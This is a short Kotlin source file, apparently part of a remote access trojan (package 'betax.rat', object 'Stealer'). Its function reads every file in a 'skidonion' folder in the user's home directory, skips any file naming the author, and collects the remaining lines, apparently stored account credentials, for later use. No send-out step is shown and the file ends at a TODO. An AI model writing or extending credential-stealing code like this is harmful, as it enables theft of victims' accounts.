package cn.trollaura.betax.rat

import java.io.File

/**
@author tRollaURa_
@since 2024/9/16
 */
object Stealer {
    fun getSkidOnionAccount(): MutableList<MutableList<String>>? {
        val file = File("${System.getProperty("user.home")}\\skidonion").listFiles() ?: return null
        return mutableListOf<MutableList<String>>()
            .apply {
                file.forEach {
                    if(it.isFile) {
                        if(it.readText().contains("tRollaURa")) return@forEach
                        add(it.readLines().toMutableList())
                    }
                }
            }
    }
    // TODO: 2024/9/16

}
